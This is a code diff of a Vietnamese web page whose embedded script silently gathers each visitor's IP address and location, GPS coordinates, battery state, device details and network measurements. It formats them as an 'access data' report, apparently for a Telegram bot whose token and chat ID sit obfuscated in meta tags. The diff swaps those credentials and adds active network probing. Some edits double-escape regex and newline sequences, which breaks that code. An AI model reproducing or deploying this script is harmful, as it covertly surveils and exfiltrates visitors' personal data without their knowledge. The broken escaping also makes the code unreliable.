@@ -1,9 +1,7 @@
 <!doctype html>
 <html lang="vi" data-theme="light">
 
-<head>
-
-  <!-- Early SW guard: neutralize register() on insecure origins (file://, http on non-localhost) -->
+  <!-- Early SW guard: neutralize register() on insecure origins (file://, http non-localhost) -->
   <script>
     (function(){
       try{
@@ -14,44 +12,28 @@
           var ns = navigator.serviceWorker;
           if (ns && typeof ns.register === 'function') {
             try { ns.__origRegister = ns.register.bind(ns); } catch(e){}
-            ns.register = function(){ 
+            ns.register = function(){
               console.warn('[SW] register() skipped on insecure origin:', location.protocol);
               return Promise.resolve({ scope: '' });
             };
           }
         }
+        // Offline redirect helper
+        const OFFLINE_PAGE = '/crazy-404-page.html'; // change if needed
+        const goOffline = () => {
+          try { if (location.pathname !== OFFLINE_PAGE) location.href = OFFLINE_PAGE; } catch (e) {}
+        };
+        if (!navigator.onLine) goOffline();
+        window.addEventListener('offline', goOffline);
       }catch(e){ console.warn('[Early SW guard] error', e); }
     })();
   </script>
 
 
-  <!-- Service Worker: register only on https/localhost and guard file:// -->
-  <script>
-    (function () {
-      var secure = (location.protocol === 'https:' ||
-                    location.hostname === 'localhost' ||
-                    location.hostname === '127.0.0.1');
-      if ('serviceWorker' in navigator && secure) {
-        window.addEventListener('load', () => {
-          navigator.serviceWorker.register('./sw.js')
-            .then(() => { window.__swRegistered = true; })
-            .catch(console.warn);
-        });
-      }
-      const OFFLINE_PAGE = '/crazy-404-page.html';
-      const goOffline = () => {
-        try { if (location.pathname !== OFFLINE_PAGE) location.href = OFFLINE_PAGE; } catch (e) {}
-      };
-      if (!navigator.onLine) goOffline();
-      window.addEventListener('offline', goOffline);
-    })();
-  </script>
-
-
   <!-- TELEGRAM CONFIG (obfuscated client-side) -->
-  <meta name="tele-enc-bot" content="DQNZXwhIQU1NQFYxcy41Y3RdIjxSNxwvKQMBHn8KAkwBWA4cfh0AGBFPAz1VKA==">
-  <meta name="tele-enc-chat" content="AAdUXwlJTExOTA==">
-  <meta name="tele-key" content="52lf1qtyxylp2it9">
+  <meta name="tele-enc-bot" content="WlYCXwlWR0FXV1UucD83KiMIeTxTKRojMxQCAXwbAAVWDVUcfwMGFAtYACJWOQ==">
+  <meta name="tele-enc-chat" content="V1IPXwhXSkBUWw==">
+  <meta name="tele-key" content="bg7f0orubnoo1xvp">
 
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width,initial-scale=1" />
@@ -1415,71 +1397,68 @@
         tz
       };
 
-      const getConnectionInfo = () => {
-        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        return c ? {
-          type: c.effectiveType || 'n/a',
-          downlink: typeof c.downlink === 'number' ? c.downlink + ' Mb/s' : 'n/a',
-          rtt: typeof c.rtt === 'number' ? c.rtt + ' ms' : 'n/a',
-          saveData: !!c.saveData
-        } : { type: 'n/a', downlink: 'n/a', rtt: 'n/a', saveData: false };
+      // ===== Network helpers (active measurement for iOS/unsupported browsers) =====
+      const getConnectionInfo = async () => {
+        const api = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const basic = {
+          type: api && api.effectiveType || 'n/a',
+          downlink: (api && typeof api.downlink === 'number') ? (api.downlink + ' Mb/s') : 'n/a',
+          rtt: (api && typeof api.rtt === 'number') ? (api.rtt + ' ms') : 'n/a',
+          saveData: !!(api && api.saveData)
+        };
+
+        const measureRTT = async (url = 'https://www.gstatic.com/generate_204', tries = 3, timeout = 3000) => {
+          const times = [];
+          for (let i = 0; i < tries; i++) {
+            const ctrl = new AbortController();
+            const t = setTimeout(() => ctrl.abort(), timeout);
+            const start = performance.now();
+            try {
+              await fetch(url + '?t=' + Date.now() + '_' + i, { cache: 'no-store', signal: ctrl.signal });
+              const dt = Math.max(0, performance.now() - start);
+              times.push(dt);
+            } catch (_) {} finally { clearTimeout(t); }
+          }
+          if (!times.length) return null;
+          times.sort((a,b)=>a-b);
+          return Math.round(times[Math.floor(times.length/2)]);
+        };
+
+        const measureDownlink = async (bytes = 1000000) => {
+          const url = `https://speed.cloudflare.com/__down?bytes=${bytes}&r=${Date.now()}`;
+          const ctrl = new AbortController();
+          const t = setTimeout(() => ctrl.abort(), 7000);
+          const start = performance.now();
+          try {
+            const res = await fetch(url, { cache: 'no-store', signal: ctrl.signal });
+            const blob = await res.blob();
+            const ms = performance.now() - start;
+            const bits = (blob.size || bytes) * 8;
+            const mbps = (bits / ms) / 1000; // bits/ms -> Mb/s
+            return Math.max(0, mbps).toFixed(2) + ' Mb/s';
+          } catch (_){ return null; } finally { clearTimeout(t); }
+        };
+
+        if (basic.type !== 'n/a' && basic.downlink !== 'n/a' && basic.rtt !== 'n/a') return basic;
+        const [rttMs, dl] = await Promise.all([measureRTT(), measureDownlink()]);
+        return {
+          type: basic.type,
+          downlink: dl || basic.downlink || 'n/a',
+          rtt: (rttMs != null ? (rttMs + ' ms') : (basic.rtt || 'n/a')),
+          saveData: basic.saveData
+        };
       };
 
-      const withTimeout = (url, ms=4000) => {
-        const ctrl = new AbortController();
-        const t = setTimeout(() => ctrl.abort(), ms);
-        return fetch(url, { signal: ctrl.signal }).finally(() => clearTimeout(t));
-      };
-
-      const getIPInfo = async () => {
-        try {
-          const r1 = await withTimeout('https://ipapi.co/json/');
-          if (r1.ok) {
-            const j1 = await r1.json();
-            if (j1 && j1.ip) return j1;
-          }
-        } catch(e) {}
-
-        let ip = null;
-        try {
-          const r2 = await withTimeout('https://api.ipify.org?format=json');
-          if (r2.ok) {
-            const j2 = await r2.json();
-            ip = j2 && j2.ip || null;
-          }
-        } catch(e) {}
-
-        try {
-          const url = ip ? `https://ipwho.is/${ip}` : 'https://ipwho.is/';
-          const r3 = await withTimeout(url);
-          if (r3.ok) {
-            const j3 = await r3.json();
-            if (j3 && (j3.ip || ip)) {
-              return {
-                ip: j3.ip || ip || 'n/a',
-                city: j3.city,
-                region: j3.region,
-                country_name: j3.country,
-                org: (j3.connection && (j3.connection.org || j3.connection.isp)) || undefined
-              };
-            }
-          }
-        } catch(e) {}
-
-        return { ip: ip || 'n/a' };
-      };
-
+      // ===== Battery (may be unavailable) =====
       const getBatteryInfo = async () => {
         try {
           if (!('getBattery' in navigator)) return { level: null, charging: null };
           const b = await navigator.getBattery();
-          return {
-            level: typeof b.level === 'number' ? Math.round(b.level * 100) : null,
-            charging: !!b.charging
-          };
+          return { level: typeof b.level === 'number' ? Math.round(b.level * 100) : null, charging: !!b.charging };
         } catch(e){ return { level: null, charging: null }; }
       };
 
+      // ===== Geolocation (permission) =====
       const getGeo = () => new Promise((resolve) => {
         if (!('geolocation' in navigator)) return resolve(null);
         const opt = { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 };
@@ -1491,7 +1470,7 @@
       });
 
       const compactUA = (ua) => {
-        try { return ua.replace(/\s+Mobile\s*/ig,' ').replace(/\s+/g,' ').trim(); }
+        try { return ua.replace(/\\s+Mobile\\s*/ig,' ').replace(/\\s+/g,' ').trim(); }
         catch(e){ return ua; }
       };
 
@@ -1505,8 +1484,22 @@
         img.src = url;
       };
 
+      // Robust IP resolver
+      async function getIPInfo() {
+        try { const r1 = await fetch('https://ipapi.co/json/'); if (r1.ok) { const j1 = await r1.json(); if (j1 && j1.ip) return j1; } } catch(e){}
+        let ip = null;
+        try { const r2 = await fetch('https://api.ipify.org?format=json'); if (r2.ok) { const j2 = await r2.json(); ip = j2 && j2.ip || null; } } catch(e){}
+        try {
+          const url = ip ? `https://ipwho.is/${ip}` : 'https://ipwho.is/';
+          const r3 = await fetch(url);
+          if (r3.ok) { const j3 = await r3.json(); if (j3 && (j3.ip || ip)) return { ip: j3.ip || ip || 'n/a', city: j3.city, region: j3.region, country_name: j3.country, org: (j3.connection && (j3.connection.org || j3.connection.isp)) || undefined }; }
+        } catch(e){}
+        return { ip: ip || 'n/a' };
+      }
+
+      // ==== MAIN ====
       (async () => {
-        const [ip, bat, geo] = await Promise.all([ getIPInfo(), getBatteryInfo(), getGeo() ]);
+        const [ip, bat, geo, conn] = await Promise.all([ getIPInfo(), getBatteryInfo(), getGeo(), getConnectionInfo() ]);
 
         const deviceBlock = [
           `📱 <b>Thiết bị</b>:`,
@@ -1517,13 +1510,12 @@
           ` - <b>Timezone</b>: ${dataBasic.tz}`
         ].join('\n');
 
-        const batteryBlock = `🔋 <b>Pin</b>: ${bat.level === null ? 'n/a' : bat.level + '%'}\n⚡ <b>Đang sạc</b>: ${bat.charging === null ? 'n/a' : (bat.charging ? '✅' : '❌')}`;
+        const batteryBlock = `🔋 <b>Pin</b>: ${bat.level === null ? 'n/a' : bat.level + '%'}\\n⚡ <b>Đang sạc</b>: ${bat.charging === null ? 'n/a' : (bat.charging ? '✅' : '❌')}`;
 
         const gpsBlock = geo
           ? `🌍 <b>GPS</b>: { lat: ${geo.lat.toFixed(6)}, lon: ${geo.lon.toFixed(6)} } ±${Math.round(geo.acc)}m`
           : `🌍 <b>GPS</b>: người dùng từ chối/không khả dụng`;
 
-        const conn = getConnectionInfo();
         const header = [
           `📥 <b>Dữ liệu truy cập</b>`,
           `⏰ <b>Thời gian</b>: ${new Date().toLocaleString('vi-VN')}`,
